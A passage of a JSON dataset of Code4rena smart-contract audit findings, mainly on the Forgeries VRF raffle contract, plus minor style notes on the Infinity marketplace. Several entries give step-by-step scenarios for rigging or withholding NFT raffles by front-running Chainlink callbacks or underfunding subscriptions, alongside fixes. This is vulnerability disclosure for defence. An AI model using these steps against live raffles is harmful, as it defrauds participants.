      "content": "\n<https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173> \n\n<https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L162-L168>\n\n### Impact\n\nThe admin/owner of `VRFNFTRandomDraw` can `startDraw()` a raffle, including emitting the `SetupDraw` event, but in a way that ensures `fulfillRandomWords()` is never called. For example:\n\n*   `keyHash` is not validated within `coordinator.requestRandomWords()`. Providing an invalid `keyHash` will allow the raffle to start but prevent the oracle from actually supplying a random value to determine the raffle result.\n    *   <https://github.com/smartcontractkit/chainlink/blob/00f9c6e41f843f96108cdaa118a6ca740b11df35/contracts/src/v0.8/VRFCoordinatorV2.sol#L407-L409>\n    *   <https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L163>\n*   The admin/owner could alternatively ensure that the owner-provided chain.link VRF subscription does not have sufficient funds to pay at the time the oracle attempts to supply random values in `fulfillRandomWords()`.\n    *   <https://github.com/smartcontractkit/chainlink/blob/00f9c6e41f843f96108cdaa118a6ca740b11df35/contracts/src/v0.8/VRFCoordinatorV2.sol#L594-L596>\n\nIn addition, the owner/admin could simply avoid ever calling `startDraw()` in the first place.\n\n### Proof of Concept\n\nProvide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.\n\n### Recommended Mitigation Steps\n\nDepending on the desired functionality with respect to the raffle owner, a successful callback to `fulfillRandomWords()` could be a precondition of the admin/owner reclaiming the reward NFT. This would help ensure the owner does not create raffles that they intend will never pay out a reward.\n\n**[iainnash (Forgeries) confirmed](https://github.com/code-423n4/2022-12-forgeries-findings/issues/101#issuecomment-1448782416)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `VRFNFTRandomDraw` contract. The admin/owner of the contract can start a raffle including emitting the `SetupDraw` event, but in a way that ensures `fulfillRandomWords()` is never called. This can be done by providing an invalid `keyHash` to `coordinator.requestRandomWords()` or by ensuring that the owner-provided chain.link VRF subscription does not have sufficient funds to pay at the time the oracle attempts to supply random values. The recommended mitigation step is to make a successful callback to `fulfillRandomWords()` a precondition of the admin/owner reclaiming the reward NFT. This will help ensure the owner does not create raffles that they intend will never pay out a reward.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/101",
      "tags": [],
      "finders": [
        "codeislight",
        "BAHOZ",
        "gasperpre",
        "trustindistrust",
        "0xdeadbeef0x",
        "deliriusz",
        "9svR6w"
      ]
    },
    {
      "id": "6396",
      "title": "[M-01] Raffle creator might not start raffle draw",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173> \n\n<https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L304> \n\n<https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L127>\n\n### Impact\n\nThe raffle creator is not required to actually give the NFT away. The NFT that is used for the raffle is transferred to the contract when `startDraw` is executed. Before that, the NFT is in the hands of the creator. This means that he might create a raffle to make users buy NFTs required to participate and then refuse to draw a winner and keep the NFT to himself. Furthermore, he might not even be the owner of the NFT in the first place, which he can achieve by flash loaning the NFT in order to pass the `ownerOf` check in `initialize` function.\n\n### Proof of Concept\n\n**Example 1**\n\n1.  User U creates an NFT collection C\n2.  He buys a BAYC NFT\n3.  He creates a raffle with it, and requires `drawingToken` to be from collection C\n4.  Users buy tokens from his collection C\n5.  He then refuses to execute `startDraw` function and rather sells the BAYC NFT\n\n**Example 2**\n\n1.  User U creates an NFT collection C\n2.  User U uses an NFT flash loan to borrow a very expensive NFT\n3.  In the same transaction he creates a raffle with this NFT, and requires `drawingToken` to be from collection C\n4.  The check that he is the owner will pass, because for the duration of the transaction he in fact is\n5.  Users see that there is a raffle for a very expensive NFT, so they buy tokens C\n6.  The winner is never drawn, because the creator does not even own the NFT\n\n**Example 3**\n\n1.  User U has an NFT X\n2.  He puts X on a sale on some NFT marketplace (which does not require him to lock it in contract)\n3.  He forgets about it and creates a raffle with it\n4.  Users buy the tokens necessary for the raffle\n5.  User U wants to execute the `startDraw` function, but just before it the NFT X is bought from him through the marketplace\n6.  The winner cannot be drawn\n\n### Recommended Mitigation Steps\n\nTransfer the NFT to the contract at the time of creation of the raffle.  You can do that by approving the factory contract to transfer the token and do the transfer in [`makeNewDraw`](https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDrawFactory.sol#L43) function between cloning and `initialization`.\n\n    address newDrawing = ClonesUpgradeable.clone(implementation);\n    IERC721(settings.token).transferFrom(msg.sender, newDrawing, settings.tokenId);\n            // Setup the new drawing\n    IVRFNFTRandomDraw(newDrawing).initialize(admin, settings);\n\nRemember to remove token transfer from `startDraw` function.\n\nNotice that the creator can still claim NFT after a week, without drawing, by executing `lastResortTimelockOwnerClaimNFT`. To prevent that, I would recommend adding a check in [`lastResortTimelockOwnerClaimNFT`](https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L304), if a winner was drawn.\n\n     if (!request.hasChosenRandomNumber) {\n                revert NEEDS_TO_HAVE_CHOSEN_A_NUMBER();\n    }\n\nSo now a user can trust that the NFT is locked in the contract, and it will be claimable only by a winner (or creator if the winner does not claim it). However, there is still no guarantee that the winner will actually be drawn, because the creator has to manually execute `startDraw` function.\nTo fix this, I would recommend allowing anyone to execute `startDraw` function, so there is no need to rely on the creator. But we would need to limit the time window of when [`startDraw`](https://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173) can be executed, so users have the time to get tokens before the drawing. That can be done by introducing a new state variable `firstDrawTime`, that acts as a timestamp after which drawing can happen.\n\n    if(block.timestamp < firstDrawTime) revert CANNOT_DRAW_YET();\n\nNotice that now the NFT can only be claimed after the winner has been drawn. This means that we are depending on ChainLink VRF to be successful. For that reason I would recommend adding a role that has the power to change the VRF subscription or restore the NFT in cases where the winner is not picked in reasonable time. This role would be given to protocol owner (owner of the factory) / DAO / someone who would be considered as most reliable.\n\n**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/88#issuecomment-1383518113):**\n > [#359 (comment)](https://github.com/code-423n4/2022-12-forgeries-findings/discussions/359#discussioncomment-4693679)\n\n**[iainnash (Forgeries) confirmed](https://github.com/code-423n4/2022-12-forgeries-findings/issues/88#issuecomment-1448780927)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the VRFNFTRandomDraw.sol contract, which is used to create a raffle. The vulnerability is that the raffle creator can create a raffle, require users to buy tokens to participate, and then refuse to draw a winner and keep the NFT for himself. The creator can also flash loan an NFT in order to pass the `ownerOf` check in `initialize` function. This means that the users who bought tokens to participate in the raffle are not guaranteed to get the NFT.\n\nTo mitigate this vulnerability, the NFT should be transferred to the contract at the time of creation of the raffle. Token transfer should also be removed from the `startDraw` function. Additionally, a check should be added in the `lastResortTimelockOwnerClaimNFT` function, so that the NFT can only be claimed by a winner or the creator if the winner does not claim it. Furthermore, anyone should be allowed to execute the `startDraw` function, and a time window should be introduced so that users have time to get tokens before the drawing. Lastly, a role should be added that has the power to change the VRF subscription or restore the NFT in case where winner is not picked in reasonable time.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/88",
      "tags": [],
      "finders": [
        "orion",
        "gasperpre",
        "evan",
        "hansfriese",
        "SmartSek"
      ]
    },
    {
      "id": "6395",
      "title": "[H-02] Draw organizer can rig the draw to favor certain participants such as their own account.",
      "impact": "HIGH",
      "content": "\nIn RandomDraw, the host initiates a draw using `startDraw()` or `redraw()` if the redraw draw expiry has passed. Actual use of Chainlink oracle is done in `\\_requestRoll`:\n\n    request.currentChainlinkRequestId = coordinator.requestRandomWords({\n        keyHash: settings.keyHash,\n        subId: settings.subscriptionId,\n        minimumRequestConfirmations: minimumRequestConfirmations,\n        callbackGasLimit: callbackGasLimit,\n        numWords: wordsRequested\n    });\n\nUse of subscription API is explained well [here](https://docs.chain.link/vrf/v2/subscription). Chainlink VRFCoordinatorV2 is called with `requestRandomWords()` and emits a random request. After `minimumRequestConfirmations` blocks, an oracle VRF node replies to the coordinator with a provable random, which supplies the random to the requesting contract via `fulfillRandomWords()`  call. It is important to note the role of subscription ID. This ID maps to the subscription charged for the request, in LINK tokens. In our contract, the raffle host supplies their subscription ID as a parameter. Sufficient balance check of the request ID is not [checked](https://github.com/smartcontractkit/chainlink/blob/286a65065fcfa5e1b2362745079cdc218e40e68d/contracts/src/v0.8/VRFCoordinatorV2.sol#L370) at request-time, but rather checked in Chainlink [node](https://github.com/smartcontractkit/chainlink/blob/806ee17236ba70926a1f07d1141808b634db48b6/core/services/vrf/listener_v2.go#L346) code as well as on-chain by [VRFCoordinator](https://github.com/smartcontractkit/chainlink/blob/286a65065fcfa5e1b2362745079cdc218e40e68d/contracts/src/v0.8/VRFCoordinatorV2.sol#L594) when the request is satisfied. In the scenario where the subscriptionID lacks funds, there will be a period of 24 hours when user can top up the account and random response will be [sent](https://docs.chain.link/vrf/v2/subscription):\n\n\"Each subscription must maintain a minimum balance to fund requests from consuming contracts. If your balance is below that minimum, your requests remain pending for up to 24 hours before they expire. After you add sufficient LINK to a subscription, pending requests automatically process as long as they have not expired.\"\n\nThe reason this is extremely interesting is because as soon as redraws are possible, the random response can no longer be treated as fair. Indeed, Draw host can wait until redraw cooldown passed (e.g. 1 hour), and only then fund the subscriptionID. At this point, Chainlink node will send a TX with the random response. If host likes the response (i.e. the draw winner), they will not interfere. If they don't like the response, they can simply frontrun the Chainlink TX with a `redraw()` call. A redraw will create a new random request and discard the old requestId so the previous request will never be accepted.\n\n    function fulfillRandomWords(\n        uint256 _requestId,\n        uint256[] memory _randomWords\n    ) internal override {\n        // Validate request ID\n    \t  // <---------------- swap currentChainlinkRequestId --->\n        if (_requestId != request.currentChainlinkRequestId) {\n            revert REQUEST_DOES_NOT_MATCH_CURRENT_ID();\n        }\n    \t...\n    }\n\n<!---->\n\n    //<------ redraw swaps currentChainlinkRequestId --->\n    request.currentChainlinkRequestId = coordinator.requestRandomWords({\n        keyHash: settings.keyHash,\n        subId: settings.subscriptionId,\n        minimumRequestConfirmations: minimumRequestConfirmations,\n        callbackGasLimit: callbackGasLimit,\n        numWords: wordsRequested\n    });\n\nChainlink docs [warn](https://docs.chain.link/vrf/v2/security) against this usage pattern of the VRF -\"Donâ€™t accept bids/bets/inputs after you have made a randomness request\". In this instance, a low subscription balance allows the host to invalidate the assumption that 1 hour redraw cooldown is enough to guarantee Chainlink answer has been received.\n\n### Impact\n\nDraw organizer can rig the draw to favor certain participants such as their own account.\n\n### Proof of Concept\n\nOwner offers a BAYC NFT for holders of their NFT collection X. Out of 10,000 tokenIDs, owner has 5,000 Xs. Rest belongs to retail users.\n\n1.  Owner subscriptionID is left with 0 LINK balance in coordinator\n2.  Redraw time is set to 2 hours\n3.  Owner calls `startDraw()` which will initiate a Chainlink request\n4.  Owner waits for 2 hours and then tops up their subscriptionID with sufficient LINK\n5.  Owner scans the mempool for `fulfillRandomWords()`\n6.  If the raffle winner is tokenID < 5000, it is owner's token\n    1.  Let fulfill execute and pick up the reward\n7.  If tokenID >= 5000\n    1.  Call `redraw()`\n    2.  fulfill will revert because of requestId mismatch\n8.  Owner has 75% of claiming the NFT instead of 50%\n\nNote that Forgeries draws are presumably intended as incentives for speculators to buy NFTs from specific collections. Without having a fair shot at receiving rewards from raffles, these NFTs user buys could be worthless. Another way to look at it is that the impact is theft of yield, as host can freely decrease the probability that a token will be chosen for rewards with this method.\n\nAlso, I did not categorize it as centralization risk as the counterparty is not Forgeries but rather some unknown third-party host which offers an NFT incentive program. It is a similar situation to the distinction made between 1st party and 3rd party projects [here](https://github.com/code-423n4/2022-10-juicebox-findings/issues/191).\n\n### Tools Used\n\n[Chainlink docs](https://docs.chain.link/vrf/v2/subscription)\n\n[Chainlink co-ordinator code](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/VRFCoordinatorV2.sol)\n\n### Recommended Mitigation Steps\n\nThe root cause is that Chainlink response can arrive up to 24 hours from the most request is dispatched, while redraw cooldown can be 1 hour+. The best fix would be to enforce minimum cooldown of 24 hours.\n\n**[iainnash (Forgeries) confirmed](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272)**\n\n**[gzeon (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1374550568):**\n > This issue weaponized [133](https://github.com/code-423n4/2022-12-forgeries-findings/issues/133) and [194](https://github.com/code-423n4/2022-12-forgeries-findings/issues/194) to violate the fairness requirement of the protocol. Downgrading this to Medium because the \n> 1. Difficulty of attack is high; you need to \n> a) front-run the fulfillRandomWords call and \n> b) own a meaningful % of the collection \n> \n> 2. Require to use an underfunded subscription\n> This will flag the raffle is fishy, since the owner might as well never fund the subscription.\n> \n> 3. 3rd party can mitigate this by funding the subscription.\n> \n> There is another case where the chainlink node waits almost 24 hours before fulfilling the request, but I don't think that is the normal behavior and is out of the attacker's control.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1376205733):**\n > Would like to respectfully state my case and why this finding is clearly HIGH impact. \n> Manipulation of RNG is an extremely serious impact as it undermines assumption of fairness which is the main selling point of raffles, lotteries etc. As proof one can view [Chainlink's ](https://immunefi.com/bounty/chainlink/) BBP which lists \"Predictable or manipulable RNG that results in abuse of downstream services\" as a critical impact, payable up to $3M.\n> \n> I would like to relate to the conditions stated by the judge:\n> > 1. Difficulty of attack is high; you need to\n> >    a) front-run the fulfillRandomWords call and\n> >    b) own a meaningful % of the collection\n> \n> frontrunning is done in practically every block by MEV bots proving it's practical and easy to do on mainnet, where the protocol is deployed. Owning a meaningful % of the collection is not necessary, as:\n> 1. Even with 1 / 10,000 NFTs, owner is still multiplying their chances which is a breach of fair random.\n> 2. The exploit can be repeated in every single raffle, exponentially multiplying their edge across time. This also highlights that the frontrunning does not have to be work every time (even though it's high %) in order for the exploitation to work.\n> 3. The draw is chosen by ownership of **\\_settings.drawingToken**, which is a project-provided token which is already likely they have a large amount of. It is unrelated to the BAYC collection / high value NFT being given out.\n> 4. It is easy to see attacker can easily half the chances of any unwanted recipient to win the raffle - they would have to have the winning ticket in both rounds. Putting the subscriber's boosted win chances aside, it's a clear theft of user's potential high value prize.\n> \n> > * Require to use an underfunded subscription\n> >   This will flag the raffle is fishy, since the owner might as well never fund the subscription.\n> > * 3rd party can mitigate this by funding the subscription\n> \n> It is unrealistic to expect users of the protocol to be savvy on-chain detectives and also anticipate this specific attack vector. Even so, the topping-up of the subscription is done directly subscriber -> ChainlinkVRFCoordinator, so it's not visible by looking at the raffle contract. \n> \n> To summarize, the characteristics of this finding are much more aligned to those of High severity, than those of Medium severity.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1376267492):**\n> The difficulty arises when only the raffle creator can perform the front running, not any interested MEV searcher. For sure, this is only 1 of the reason I think the risk of this issue is not High.\n\n> As the project seems to be fine with a raffle being created, but never actually started; I think when the attack require a chainlink subscription to be underfunded to begin with also kinda fall in to the \"creator decided not to start raffle\" category.\n\n> The argument of judging this apart from that is the raffle would looks like it completed but might not be fair, which I think is a very valid issue. However, I don't see this as High risk given the relative difficulty as said and we seems to agree that it is fine if the raffle creator decided not to start the raffle. The end state would basically be the same.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1376282150):**\n > The end states are in my opinion very different. In order to understand the full impact of the vulnerability we need to understand the context in which those raffles take place. The drawing tokens are shilled to give users a chance to win a high valued item. Their worth is correlated to the fair chance users think they have in winning the raffle. The \"fake raffle\" on display allows the attacker to keep profiting from ticket sales while not giving away high value. I think this is why \n> @iainnash agreed this to be a high risk find. \n> \n> I've also listed several other justifications including theft of user's chances of winning which is high impact. I'd be happy to provide additional proof of why frontrunning is easily high enough % if that is the source of difficulty observed.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1376307513):**\n > > The drawing tokens are shilled to give users a chance to win a high valued item. Their worth is correlated to the fair chance users think they have in winning the raffle. \n\n> That's my original thought, but you and the sponsor tried to convince me the raffle is permissioned by design considering startDraw. \n\n>If we think we need to guarantee the raffle token can get something fairly, we will also need to guarantee the raffle will, well, start. So I would say these are very similar since the ticket would be already sold anyway.\n\n>I think I might either keep everything as-is, or I am going to reinstate those other issues that I invalidated due to assuming the permissioned design, and upgrading this to High. Would love to hear more from the sponsor before making the final call.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1379859299):**\n> Regarding your smart observation @gzeon , I think the idea is clearly to make the draw methods decentralized in the future, but owner controlled as a first step. However they were not aware of this exploit, which from day 1 allows to put on a show and drive draw token prices up.\n\n**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/272#issuecomment-1383501062):**\n > [#359 (comment)](https://github.com/code-423n4/2022-12-forgeries-findings/discussions/359#discussioncomment-4693679)\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the RandomDraw contract of the Forgeries project. This contract uses the Chainlink oracle to request a provable random number, which is then used to decide the winner of the draw. The problem is that the request ID used for the random number is supplied by the draw host, and if the subscription ID associated with the request does not have enough LINK tokens, the request can remain pending for up to 24 hours. This means that the draw host can wait until the redraw cooldown has passed (e.g. 1 hour) and then top up the subscription ID with sufficient LINK tokens, allowing them to rig the draw to favor certain participants such as their own account. \n\nThe impact is that users may be misled into buying tokens from a specific collection, believing that they have a fair chance of receiving rewards from the raffle, when in reality the draw host has a much higher chance of winning.\n\nThe recommended mitigation step is to enforce a minimum cooldown of 24 hours, so that the draw host cannot top up the subscription ID after the redraw cooldown has passed.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/272",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "6394",
      "title": "[H-01] Admin does not have to wait to call `lastResortTimelockOwnerClaimNFT()`",
      "impact": "HIGH",
      "content": "\nOn contest page:\n`\"If no users ultimately claim the NFT, the admin specifies a timelock period after which they can retrieve the raffled NFT.\"`\n\nLet's assume a recoverTimelock of 1 week.\n\nThe specification suggests that 1 week from the winner not having claimed the NFT. Meaning that the admin should only be able to call `lastResortTimelockOwnerClaimNFT()` only after `<block.timestamp at fulfillRandomWords()> + request.drawTimelock + 1 weeks`.\n\nSpecification:\n\n             drawTimelock                recoverTimelock\n                 â”‚                              â”‚\n                 â–¼                              â–¼\n            â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n            â”‚    â”‚           1 week             â”‚\n            â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n            â–²\n            â”‚\n    fulfillRandomWords()\n\n*   The winner should have up to `drawTimelock` to claim before an admin can call `redraw()` and pick a new winner.\n*   The winner should have up to `recoverTimelock` to claim before an admin can call `lastResortTimelockOwnerClaimNFT()` to cancel the raffle.\n\nBut this is not the case.\n\n**recoverTimelock** is set in the `initialize(...)` function and nowhere else. That means 1 week from initialization, the admin can call `lastResortTimelockOwnerClaimNFT()`. `redraw()` also does not update `recoverTimelock`.\n\nIn fact, `startDraw()` does not have to be called at the same time as `initialize(...)`. That means that if the draw was started after having been initialized for 1 week, the admin can withdraw at any time after that.\n\n### Impact\n\nProtocol does not work as intended.\n\n### Recommended Mitigation Steps\n\nJust like for `drawTimelock`, `recoverTimelock` should also be updated for each dice roll.\n`<block.timestamp at fulfillRandomWords()> + request.drawTimelock + <recoverBufferTime>`. Where `<recoverBufferTime>` is essentially the `drawBufferTime` currently used, but for `recoverTimelock`.\n\n**Note:** currently, `drawTimelock` is updated in the `_requestRoll()` function. This is \"technically less correct\" as chainlink will take some time before `fulfillRandomWords(...)` callback. So the timelock is actually set before the winner has been chosen.  This should be insignificant under normal network conditions (Chainlink VRF shouldn't take > 1min) but both timelocks should be updated in the same function - either `_requestRoll()` or `fulfillRandomWords(...)`.\n\n**[iainnash (Forgeries) confirmed and commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/146#issuecomment-1358257045):**\n > This seems to be a dupe of a previous issue where the timelock is not passed. \n> \n> Give this timelock is validated from the end of the auction the risk here seems Low.\n\n**[gzeon (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-forgeries-findings/issues/146#issuecomment-1383516964):**\n > [#359 (comment)](https://github.com/code-423n4/2022-12-forgeries-findings/discussions/359#discussioncomment-4693679)\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability related to the VRFNFTRandomDraw.sol contract. The specification for the contract states that the admin can only call the lastResortTimelockOwnerClaimNFT() after the drawTimelock has expired, plus one week. However, the recoverTimelock is set in the initialize() function and not updated anywhere else. This means that the admin can call lastResortTimelockOwnerClaimNFT() one week after initialization, regardless of when the draw was started. This could allow the admin to withdraw the NFT at any time after the initialization.\n\nThe impact of this vulnerability is that the protocol does not work as intended. The recommendation is that, just like the drawTimelock, the recoverTimelock should also be updated for each dice roll. This should be done either in the _requestRoll() function or the fulfillRandomWords() callback. Additionally, the drawTimelock should also be updated in the same function to ensure that the winner is chosen before the timelock is set.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "https://github.com/code-423n4/2022-12-forgeries-findings/issues/146",
      "tags": [],
      "finders": [
        "dic0de",
        "ladboy233",
        "HE1M",
        "Ch_301",
        "Zarf",
        "carrotsmuggler",
        "jadezti",
        "Trust",
        "gz627",
        "btk",
        "csanuragjain",
        "Titi",
        "maks",
        "kuldeep",
        "hihen",
        "immeas",
        "sces60107",
        "sk8erboy",
        "Koolex",
        "hansfriese",
        "SmartSek",
        "imare",
        "9svR6w",
        "rvierdiiev",
        "Apocalypto",
        "bin2chen",
        "Soosh",
        "dipp",
        "indijanc",
        "neumo",
        "obront"
      ]
    },
    {
      "id": "24283",
      "title": "[N-08] Scientific notation",
      "impact": "LOW",
      "content": "\nFor readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[uint32 public WETH_TRANSFER_GAS_UNITS = 50000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L61)\\\n[20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L202)\\\n[1000000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L381)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L819)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L873)\\\n[10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1135)\\\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1161)\n\n#### InfinityOrderBookComplication.sol\n\n[10\\*\\*4](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L338)\n\n#### InfinityStaker.sol\n\n[uint16 public BRONZE_STAKE_THRESHOLD = 1000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L33)\\\n[uint16 public SILVER_STAKE_THRESHOLD = 5000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L34)\\\n[uint16 public GOLD_STAKE_THRESHOLD = 10000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L35)\\\n[uint16 public PLATINUM_STAKE_THRESHOLD = 20000](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L36)\\\n[10\\*\\*18](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L237)\n\n### Mitigation\n\nReplace the numbers aforementioned with their scientific notation\n\n**[nneverlander (Infinity) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/299#issuecomment-1163395467):**\n > Thanks\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/299#issuecomment-1183717266):**\n > I love how you name the inlined links -- really improves the readability.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24282",
      "title": "[N-07] Related data should be grouped in struct",
      "impact": "LOW",
      "content": "\nWhen there are mappings that use the same key value, having separate fields is error prone, for instance in case of deletion or with future new fields.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n    mapping(address => uint256) public userMinOrderNonce;\n    mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n### Mitigation\n\nGroup the related data in a struct and use one mapping:\n\n    struct OrderNonce {\n      uint256 userMin;\n      mapping(uint256 => bool) isExecutedOrCancelled;\n    }\n\nAnd it would be used as a state variable:\n\n    mapping(address =>  OrderNonce) orderNonces;\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24281",
      "title": "[N-06] Public functions can be external",
      "impact": "LOW",
      "content": "\nIt is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[function getUserTotalStaked()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L154)\\\n[function getUserTotalVested()](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L154)\n\n### Mitigation\n\nDeclare these functions as `external` instead of `public`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24280",
      "title": "[N-05] Function missing comments",
      "impact": "LOW",
